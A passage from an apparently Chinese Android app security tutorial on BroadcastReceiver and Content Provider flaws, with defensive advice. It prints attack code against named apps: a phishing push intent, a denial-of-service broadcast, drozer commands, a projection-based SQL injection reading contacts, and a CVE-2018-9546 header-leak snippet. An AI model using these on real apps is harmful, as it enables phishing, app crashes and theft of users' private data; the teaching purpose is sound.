class="selector-class">.pushservice</span><span class="selector-class">.action</span>.MESSAGE</span><br></pre></td></tr></table></figure><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"> i.setAction(<span class="string">&quot;com.baidu.android.pushservice.action.MESSAGE&quot;</span>)；</span><br><span class="line"> <span class="type">Bundle</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">jsobject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"><span class="comment">//1. phishing</span></span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">custom_content_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">     jsobject.put(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;百度云盘【漏洞你中奖了！】&quot;</span>);</span><br><span class="line">     jsobject.put(<span class="string">&quot;description&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">     <span class="comment">//jsobject.put(&quot;url&quot;, &quot;http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk&quot;);</span></span><br><span class="line">     jsobject.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://drops.wooyun.org/webview.html&quot;</span>);</span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">customcontent_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();          </span><br><span class="line">     customcontent_js.put(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;msg_type&quot;</span>, <span class="string">&quot;resources_push&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;uk&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;shareId&quot;</span>, <span class="string">&quot;1&quot;</span>);     </span><br><span class="line">     jsobject.put(<span class="string">&quot;custom_content&quot;</span>, customcontent_js);      </span><br><span class="line">     <span class="type">String</span> <span class="variable">cmd</span>  <span class="operator">=</span> jsobject.toString();</span><br><span class="line">     b.putByteArray(<span class="string">&quot;message&quot;</span>, cmd.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">     <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">     e.printStackTrace();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><p><strong>漏洞介绍</strong></p><p>如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。<br>拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。</p><p><strong>漏洞复现</strong></p><p>案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-042755.html">QQ手机管家拒绝服务漏洞</a></p><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">componetName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(  <span class="string">&quot;com.tencent.qqpimsecure&quot;</span>,  <span class="string">&quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;</span>);        </span><br><span class="line">i.setComponent(componetName);      </span><br><span class="line">sendBroadcast(i);</span><br></pre></td></tr></table></figure><p>案例2：fourgoats.apk拒绝服务攻击崩溃</p><p>我们首先用drozer测试可导出组件</p><p><code>run app.broadcast.info  -a org.owasp.goatdroid.fourgoats</code></p><p><img src="2025-01-15-App安全分析指南/image-20240922203759422.png" alt="image-20240922203759422"></p><p>找到导出的组件</p><p>我们根据组件的类名找对对应的源码信息，发现需要两个参数 phoneNumber、message：</p><p>我们发送恶意广播：格式如下</p><p><code>run app.broadcast.send --action action --extra string name lisi</code></p><p><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message dog</code></p><p>我们再向广播组件发送不完整intent，使用空 extras，可以看到应用停止运行：</p><p><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</code></p><h3 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护"></a>安全防护</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）私有广播接收器设置<span class="attribute">exported</span>=’false’,并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。</span><br><span class="line">（2）对接收来的广播进行验证。</span><br><span class="line">（3）内部app之间的广播使用<span class="attribute">protectionLevel</span>=’signature’ 验证其是否真是内部app。</span><br><span class="line">（4）返回结果时需注意接收app是否会泄露信息。</span><br><span class="line">（5）发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者setPackage(String packageName)。</span><br><span class="line">（6）使用LocalBroadcastManager。</span><br></pre></td></tr></table></figure><h2 id="Content-Provider组件相关漏洞"><a href="#Content-Provider组件相关漏洞" class="headerlink" title="Content Provider组件相关漏洞"></a>Content Provider组件相关漏洞</h2><p>我们创建一个Content Provider，其他应用通过<strong>ContentResolver</strong>来访问提供的数据，而<strong>ContentResolver</strong>通过uri来定位自己要访问的数据</p><h3 id="uri介绍"><a href="#uri介绍" class="headerlink" title="uri介绍"></a>uri介绍</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）定义：Uniform Resource Identifier，即统一资源标识符</span><br><span class="line">（<span class="number">2</span>）作用：唯一标识ContentProvider <span class="meta">&amp;其中的数据</span></span><br><span class="line">（<span class="number">3</span>）外界进程通过URL找到对应的ContentProvider <span class="meta">&amp;其中数据，再进行数据操作</span></span><br></pre></td></tr></table></figure><p><strong>自定义URI</strong></p><p><img src="2025-01-15-App安全分析指南/905443_92EXMEKYH5VR3J2.png" alt="image-20210922094010216"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）标准前缀<span class="symbol">:content</span><span class="symbol">://</span> ,用来说明一个<span class="title class_">Content</span> <span class="title class_">Provider</span>控制这些数据</span><br><span class="line">（<span class="number">2</span>）<span class="variable constant_">URL</span>的标识：com.carson.provider, 用于唯一标识这个<span class="title class_">ContentProvider</span>，外部调用者可以根据这个标识来找到它。对于第三方程序，为了保证<span class="variable constant_">URL</span>标识的一致性，必须是一个完整的、小写的类名，这个标识在元素的authorities属性中说明，一般是定义该<span class="title class_">ContentProvider</span>的包.类的名称</span><br><span class="line">（<span class="number">3</span>）路径：<span class="title class_">User</span>,要操作的数据库中表的名字，或者可以自己定义，记得在使用的时候保持一致</span><br><span class="line">（<span class="number">4</span>）记录<span class="variable constant_">ID</span><span class="symbol">:id</span>, 如果<span class="variable constant_">URL</span>中包含表示需要获取的记录<span class="variable constant_">ID</span>,则返回该id对应的数据，如果没有<span class="variable constant_">ID</span>,就表示返回全部</span><br></pre></td></tr></table></figure><p>若要将一个字符串转换成URI，可以使用parse</p><p><code>Uri uri</code>=<code> </code>Uri.parse(<code>&quot;content://com.carson.provider/User&quot;</code>)；</p><p><strong>给出一个URI示例</strong></p><p><code>http://www.baidu.com:8080/wenku/jiatiao.html?id=123456&amp;name=jack</code></p><p>获得URI的各个部分：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getScheme</span><span class="params">()</span></span>：获取 Uri 中的 scheme 字符串部分，在这里是 http</span><br><span class="line"><span class="function"><span class="title">getHost</span><span class="params">()</span></span>：获取 Authority 中的 Host 字符串，即 www<span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br><span class="line"><span class="function"><span class="title">getPost</span><span class="params">()</span></span>：获取 Authority 中的 Port 字符串，即 <span class="number">8080</span></span><br><span class="line"><span class="function"><span class="title">getPath</span><span class="params">()</span></span>：获取 Uri 中 <span class="selector-tag">path</span> 部分，即 wenku/jiatiao<span class="selector-class">.html</span></span><br><span class="line"><span class="function"><span class="title">getQuery</span><span class="params">()</span></span>：获取 Uri 中的 query 部分，即 id=<span class="number">15</span>&amp;name=jack</span><br><span class="line"><span class="function"><span class="title">getSchemeSpecificPart</span><span class="params">()</span></span>：域名+端口号+路径+参数</span><br><span class="line">getAuthority：获取用户信息+域名+端口号</span><br><span class="line">getUserInfo：获取用户信息数据</span><br></pre></td></tr></table></figure><p><strong>MIME</strong></p><p><a href="https://blog.csdn.net/ldld1717/article/details/52180017">https://blog.csdn.net/ldld1717/article/details/52180017</a></p><p>MIME是指定某一个拓展名的文件用那一种应用程序打开</p><p>就像用浏览器查看PDF格式的文件，浏览器会选择合适的应用打开。ContentProvider 会根据 URI 来返回 MIME 类型，ContentProvider 会返回一个包含两部分的字符串。MIME 类型一般包含两部分，如：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span>/html</span><br><span class="line"><span class="built_in">text</span>/css</span><br><span class="line"><span class="built_in">text</span>/xml</span><br><span class="line"><span class="built_in">application</span>/pdf</span><br></pre></td></tr></table></figure><p>分为类型和子类型，Android 遵循类似的约定来定义MIME类型，每个内容类型的 Android MIME 类型有两种形式：多条记录（集合）和单条记录。</p><ul><li><p>集合记录(dir):<br>vnd.android.cursor.<code>dir</code>/``自定义</p></li><li><p>单条记录(item)：</p><p>vnd.android.cursor.item/自定义</p></li></ul><p>vnd 表示这些类型和子类型具有非标准的、供应商特定的形式。Android中类型已经固定好了，不能更改，只能区别是集合还是单条具体记录，子类型可以按照格式自己填写，在使用 Intent 时，会用到 MIME，根据 Mimetype 打开符合条件的活动。</p><h3 id="URI解析"><a href="#URI解析" class="headerlink" title="URI解析"></a>URI解析</h3><p>这里URI代表要操作的数据，我们在对数据进行获取时需要解析URI，Android提供了两个操作URI的工具类：<strong>UriMatcher</strong> 和 <strong>ContentUris</strong></p><p><strong>UriMatcher</strong></p><ul><li>将需要匹配的Uri路径进行注册</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//常量UriMatcher.NO_MATCH表示不匹配任何路径的返回码</span></span><br><span class="line"><span class="type">UriMatcher</span>  <span class="variable">sMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UriMatcher</span>(UriMatcher.NO_MATCH);</span><br><span class="line"><span class="comment">//如果match()方法匹配“content://com.wang.provider.myprovider/tablename”路径，返回匹配码为1</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;content://com.wang.provider.myprovider&quot;</span>, <span class="string">&quot; tablename &quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//如果match()方法匹配content://com.wang.provider.myprovider/tablename/11路径，返回匹配码为2</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;com.wang.provider.myprovider&quot;</span>, <span class="string">&quot;tablename/#&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>此处采用 addURI 注册了两个需要用到的 URI；注意，添加第二个 URI 时，路径后面的 id 采用了通配符形式 “#”，表示只要前面部分都匹配上了就 OK</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*:表示匹配任意长度的任意字符</span><br><span class="line"><span class="comment">#:表示匹配任意长度的数字</span></span><br><span class="line">匹配任意表的内容URI格式：</span><br><span class="line">content：<span class="regexp">//</span>com.example.app.provider/*</span><br><span class="line">匹配table表中<span class="number">1</span>任意一行数据的内容URI格式：</span><br><span class="line">content：<span class="regexp">//</span>com.example.app.procider<span class="regexp">/table/</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><ul><li><p>注册完需要匹配的 Uri 后，可以使用 sMatcher.match(Uri) 方法对输入的 Uri 进行匹配，如果匹配就返回对应的匹配码，匹配码为调用 addURI() 方法时传入的第三个参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (sMatcher.match(Uri.parse(<span class="string">&quot;content://com.zhang.provider.yourprovider/tablename/100&quot;</span>))) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="comment">//match 1, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span></span><br><span class="line">      <span class="comment">//match 2, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">//match nothing, todo something</span></span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>ContentUris</strong></p><p>ContentUris类用于操作Uri路径后面的ID部分，有两个常用方法：</p><p>withAppendedId(Uri uri, long id)和parseId(Uri uri)</p><ul><li><p>withAppendedId(Uri uri, long id)用于为路径加上ID部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"><span class="comment">//生成的Uri为：content://com.wang.provider.myprovider/tablename/10</span></span><br><span class="line"> <span class="type">Uri</span> <span class="variable">resultUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">10</span>);</span><br></pre></td></tr></table></figure></li><li><p>parseId(Uri uri)则从路径中获取ID部分:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.zhang.provider.myprovider/tablename/10&quot;</span>)</span><br><span class="line"><span class="comment">//获取的结果为：10</span></span><br><span class="line"><span class="type">long</span> <span class="variable">personid</span> <span class="operator">=</span> ContentUris.parseId(uri);</span><br></pre></td></tr></table></figure></li></ul><h3 id="ContentProvider操作数据"><a href="#ContentProvider操作数据" class="headerlink" title="ContentProvider操作数据"></a>ContentProvider操作数据</h3><p>当外部应用需要对ContentProvider中的数据进行添加、删除、修改及查询操作时，可以使用ContentResolver类来完成，要获取ContentResolver对象，可以使用Activity提供getContentResolver()</p><p>ContentResolver类提供了与ContentProvider类相同签名的四个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span>，往ContentProvider添加数据；</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span>，从ContentProvider删除数据；</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span>，更新ContentProvider中的数据；</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span>，从ContentProvider中获取数据；</span><br></pre></td></tr></table></figure><p>使用ContentResolver对ContentProvider中的数据进行操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line"> <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"> <span class="comment">//添加一条记录</span></span><br><span class="line"> <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line"> values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;wang1&quot;</span>);</span><br><span class="line"> values.put(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>);</span><br><span class="line"> resolver.insert(uri, values);</span><br><span class="line"> <span class="comment">//获取tablename表中所有记录</span></span><br><span class="line"> <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> resolver.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;tablename data&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">   Log.i(<span class="string">&quot;ContentTest&quot;</span>, <span class="string">&quot;tablename_id=&quot;</span>+ cursor.getInt(<span class="number">0</span>)+ <span class="string">&quot;, name=&quot;</span>+ cursor.getString(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//把id为2的记录的name字段值更改新为zhang1</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">updateValues</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">updateValues.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;zhang1&quot;</span>);</span><br><span class="line"><span class="type">Uri</span> <span class="variable">updateIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.update(updateIdUri, updateValues, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//删除id为2的记录，即字段age</span></span><br><span class="line"><span class="type">Uri</span> <span class="variable">deleteIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.delete(deleteIdUri, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h3 id="监听数据变化"><a href="#监听数据变化" class="headerlink" title="监听数据变化"></a>监听数据变化</h3><p>如果ContentProvider的访问者需要知道数据发生的变化，可以在ContentProvider发生数据变化时调用getContentResolver().notifyChange(uri, null)来通知注册在此URI上的访问者。只给出类中监听部分的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span> &#123;</span><br><span class="line">     db.insert(<span class="string">&quot;tablename&quot;</span>, <span class="string">&quot;tablenameid&quot;</span>, values);</span><br><span class="line">      getContext().getContentResolver().notifyChange(uri, <span class="literal">null</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而访问者必须使用ContentObserver对数据（数据采用uri描述）进行监听，当监听到数据变化通知时，系统就会调用ContentObserver的onChange()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getContentResolver().registerContentObserver(Uri.parse(<span class="string">&quot;content://com.ljq.providers.personprovider/person&quot;</span>),</span><br><span class="line">        <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">PersonObserver</span>(<span class="keyword">new</span> <span class="title class_">Handler</span>()));</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonObserver</span> <span class="keyword">extends</span> <span class="title class_">ContentObserver</span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">PersonObserver</span><span class="params">(Handler handler)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(handler);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onChange</span><span class="params">(<span class="type">boolean</span> selfChange)</span> &#123;</span><br><span class="line">        <span class="comment">//to do something</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="Content-Provider漏洞原理分析"><a href="#Content-Provider漏洞原理分析" class="headerlink" title="Content Provider漏洞原理分析"></a>Content Provider漏洞原理分析</h3><ul><li>信息泄露</li><li>SQL注入</li><li>目录遍历</li></ul><p>Content Provider漏洞的危害：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Android中Content </span>Provider起到在不同的进程APP之间实现共享数据的作用，通过<span class="keyword">Binder进程间通信机制以及匿名共享内存机制来实现，但是考虑到数据的安全性，我们需要设置一定的保护权限。</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">Binder进程间通信机制突破了以应用程序为边界的权限控制，是安全可控的，数据的访问接口由数据的所有者来提供，数据提供方实现安全控制，决定数据的读写操作</span></span><br><span class="line"><span class="keyword"></span>而content Provider组件本身提供了读取权限控制，这导致在使用过程中就会存在一些漏洞</span><br></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">列出uri</span><br><span class="line"><span class="keyword">run</span> <span class="keyword">app</span>.provider.finduri 包名</span><br><span class="line"></span><br><span class="line">输出数据内容</span><br><span class="line">adb <span class="keyword">shell</span> content <span class="keyword">query</span> --uri + 具体uri路径  或者 <span class="keyword">run</span> <span class="keyword">app</span>.provider.<span class="keyword">query</span> <span class="string">&quot;具体uri&quot;</span></span><br></pre></td></tr></table></figure><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p><strong>原理介绍</strong></p><p>content URI是一个标志provider中的数据的URI。Content URI中包含了整个provider的以符号表示的名字(它的authority)和指向一个表的名字(一个路径)。当你调用一个客户端的方法来操作一个provider中的一个表，指向表的contentURI是参数之一，如果对ContentProvider的权限没有做好控制，就有可能导致恶意的程序通过这种方式读取APP的敏感数据。</p><p><strong>漏洞复现</strong></p><p>案例：<strong>盛大有你Android存在信息泄露漏洞</strong></p><p><strong>目标代码</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;.providers.YouNiProvider&quot;</span> </span></span><br><span class="line"><span class="tag">          <span class="attr">android:process</span>=<span class="string">&quot;com.snda.youni.mms&quot;</span>   <span class="attr">android:authorities</span>=<span class="string">&quot;com.snda.youni.providers.DataStructs&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getyouni</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ContentResolver contentresolver=getContentResolver();</span><br><span class="line">    String[] projection=&#123;<span class="string">&quot;* from contacts--&quot;</span>&#125;;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span>Uri.parse(<span class="string">&quot;content://com.snda.youni.providers.DataStructs/message_ex&quot;</span>);</span><br><span class="line">    Cursor cursor=contentresolver.query(uri.projection,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">    String text=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">        text+=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;display_name&quot;</span>))+<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.i(<span class="string">&quot;TEST&quot;</span>,text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码分析:</strong></p><p>我们可以分析目标程序的provider的进程名和授权的的URI，我们可以根据授权的URI来构建一个URI，然后通过contentresolver去读取里面的的列表名信息，这样我们就可以获取APP中的隐私数据信息。</p><p>案例2：sieve.apk</p><ul><li><p>先扫描可访问的URI<br><code>run scanner.provider.finduris -a &lt;包名&gt;</code><br><img src="2025-01-15-App安全分析指南/image-20240923165949228.png" alt="image-20240923165949228"></p></li><li><p>可以对敏感信息进行读取<br><img src="2025-01-15-App安全分析指南/image-20240923170729848.png" alt="image-20240923170729848"></p></li><li><p>可以看到有账号密码之类的数据</p></li></ul><p>案例3：<a href="https://mabin004.github.io/2019/04/15/Android-Download-Provider漏洞分析/">CVE-2018-9546: Download Provider文件头信息泄露</a></p><p><strong>漏洞描述</strong></p><p>Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。</p><p><strong>目标代码</strong></p><p>读取header的URI为：<code>content://download/mydownloads/download_id/headers</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://download/mydownloads/1493/headers&quot;</span>);</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 